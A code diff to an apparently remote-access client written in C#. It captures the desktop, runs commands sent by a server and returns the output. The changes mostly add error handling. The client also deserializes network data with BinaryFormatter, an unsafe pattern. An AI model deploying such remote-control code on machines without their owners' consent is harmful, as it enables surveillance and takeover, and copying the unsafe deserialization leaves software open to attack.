@@ -31,9 +31,16 @@ namespace netRAtoolClient
         {
             BinaryFormatter binFormatter = new BinaryFormatter();
 
-            mainStream = client.GetStream();
-            binFormatter.Serialize(mainStream, "img");
-            binFormatter.Serialize(mainStream, TakeDesktop());
+            try
+            {
+                mainStream = client.GetStream();
+                binFormatter.Serialize(mainStream, "img");
+                binFormatter.Serialize(mainStream, TakeDesktop());
+            }
+            catch
+            {
+                Console.WriteLine("# SendDesktopImage: Execute error!!!"); ;
+            }
         }
 
         private String execCommand(String argCommand)
@@ -66,18 +73,24 @@ namespace netRAtoolClient
 
             while (true)
             {
-                stream = client.GetStream();
+                try
+                {
+                    stream = client.GetStream();
 
-                outToServer = (String)binFormatterSend.Deserialize(stream);
-                Console.WriteLine("#EXEC: execute cmd: " + outToServer);
-
-                timer1.Stop();
-                outToServer = execCommand(outToServer);
-                
-                binFormatterSend.Serialize(stream, "cmd");
-                binFormatterSend.Serialize(stream, outToServer);
-
-                timer1.Start();
+                    outToServer = (String)binFormatterSend.Deserialize(stream);
+                    Console.WriteLine("#EXEC: execute cmd: " + outToServer);
+                    outToServer = execCommand(outToServer);
+                    Console.WriteLine(outToServer);
+                    if (stream.CanWrite)
+                    {
+                        binFormatterSend.Serialize(stream, "cmd");
+                        binFormatterSend.Serialize(stream, outToServer);
+                    }
+                }
+                catch
+                {
+                    Console.WriteLine("# ListenFromServer: Execute error!!!");
+                }
             }
             Console.WriteLine("ListenFromServer finish");
         }
@@ -95,7 +108,7 @@ namespace netRAtoolClient
                 Console.WriteLine("#Client: Connected to server");
                 ListeningServer = new Thread(ListenFromServer);
 
-                timer1.Start();
+                //timer1.Start();
                 ListeningServer.Start();
             }
             catch(Exception)
